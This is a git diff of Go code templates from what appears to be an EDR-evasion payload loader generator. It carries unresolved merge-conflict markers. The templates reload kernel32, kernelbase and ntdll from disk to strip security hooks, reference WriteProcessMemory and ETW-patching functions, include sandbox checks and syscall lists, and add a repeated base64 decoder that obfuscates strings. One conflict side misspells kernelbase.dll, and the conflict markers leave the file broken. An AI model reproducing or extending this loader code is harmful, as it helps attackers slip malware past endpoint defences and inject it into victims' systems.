@@ -319,7 +319,11 @@ func DLL_Refresher() string {
 
 	import (
 		"debug/pe"
+<<<<<<< HEAD
 		{{.Variables.B64}}
+=======
+		"encoding/base64"
+>>>>>>> e319103 (v4.0)
 		{{.Variables.HEX_Import}}
 		"[loader]/[loader]"
 		"io/ioutil"
@@ -366,7 +370,11 @@ func DLL_Refresher() string {
 		err := {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
 		if err != nil {
 		}
+<<<<<<< HEAD
 		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'r', '.', 'd', 'l', 'l'}))
+=======
+		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}))
+>>>>>>> e319103 (v4.0)
 		if err != nil {
 		}
 		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
@@ -374,6 +382,22 @@ func DLL_Refresher() string {
 		}
 	
 	}
+<<<<<<< HEAD
+
+	{{.Variables.WriteProcessMemory_Function}}
+=======
+	func {{.Variables.decode}}({{.Variables.b64}} string,) string {
+		var {{.Variables.decoded}} []byte
+			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
+		{{.Variables.sum}} := 1
+		for i := 1; i < {{.Variables.number}}; i++ {
+			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
+			{{.Variables.sum}} += i
+		}
+		return string({{.Variables.decoded}})
+	
+	}
+>>>>>>> e319103 (v4.0)
 
 	{{.Variables.WriteProcessMemory_Function}}
 
@@ -470,7 +494,11 @@ func Binary() string {
 
 	import (
 		"debug/pe"
+<<<<<<< HEAD
 		{{.Variables.B64}}
+=======
+		"encoding/base64"
+>>>>>>> e319103 (v4.0)
 		"time"
 		"[loader]/[loader]"
 		{{.Variables.HEX_Import}}
@@ -480,7 +508,7 @@ func Binary() string {
 		"unsafe"
 		"strconv"
 		{{.Variables.SandboxOS}}
-	
+
 		"golang.org/x/sys/windows"
 		"golang.org/x/sys/windows/registry"
 
@@ -533,6 +561,20 @@ func Binary() string {
 			{{.Variables.SyscallNumberlist}}
 
 	}
+<<<<<<< HEAD
+=======
+	func {{.Variables.decode}}({{.Variables.b64}} string,) string {
+		var {{.Variables.decoded}} []byte
+			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
+		{{.Variables.sum}} := 1
+		for i := 1; i < {{.Variables.number}}; i++ {
+			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
+			{{.Variables.sum}} += i
+		}
+		return string({{.Variables.decoded}})
+	
+	}
+>>>>>>> e319103 (v4.0)
 
 	{{.Variables.WriteProcessMemory_Function}}
 
@@ -545,7 +587,11 @@ func Binary() string {
 		if err != nil {
 			{{.Variables.RefreshPE}}
 		}
+<<<<<<< HEAD
 		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'r', '.', 'd', 'l', 'l'}))
+=======
+		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}))
+>>>>>>> e319103 (v4.0)
 		if err != nil {
 			{{.Variables.RefreshPE}}
 		}
@@ -645,14 +691,23 @@ func DLL() string {
 	import "C"
 
 	import (
+<<<<<<< HEAD
 		{{.Variables.B64}}
+=======
+		"encoding/base64"
+>>>>>>> e319103 (v4.0)
 		{{.Variables.HEX_Import}}
 		"[loader]/[loader]"
 		"strconv"
 		"syscall"
 		"unsafe"
 		{{.Variables.SandboxOS}}
+<<<<<<< HEAD
 		"golang.org/x/sys/windows"
+=======
+		
+		{{.Variables.Windows_Import}}
+>>>>>>> e319103 (v4.0)
 		"golang.org/x/sys/windows/registry"
 	
 	)
@@ -682,7 +737,22 @@ func DLL() string {
 				{{.Variables.SyscallNumberlist}}
 
 	}
+<<<<<<< HEAD
 		
+=======
+	func {{.Variables.decode}}({{.Variables.b64}} string,) string {
+		var {{.Variables.decoded}} []byte
+			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
+		{{.Variables.sum}} := 1
+		for i := 1; i < {{.Variables.number}}; i++ {
+			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
+			{{.Variables.sum}} += i
+		}
+		return string({{.Variables.decoded}})
+	
+	}	
+
+>>>>>>> e319103 (v4.0)
 	{{.Variables.WriteProcessMemory_Function}}
 
 	{{.Variables.ETW_Function}}
@@ -751,6 +821,7 @@ func WriteProcessMemory_Function() string {
 	
 		return e
 	}
+<<<<<<< HEAD
 
 
 	func {{.Variables.decode}}({{.Variables.b64}} string,) string {
@@ -766,6 +837,8 @@ func WriteProcessMemory_Function() string {
 	}
 
 
+=======
+>>>>>>> e319103 (v4.0)
 	`
 }
 
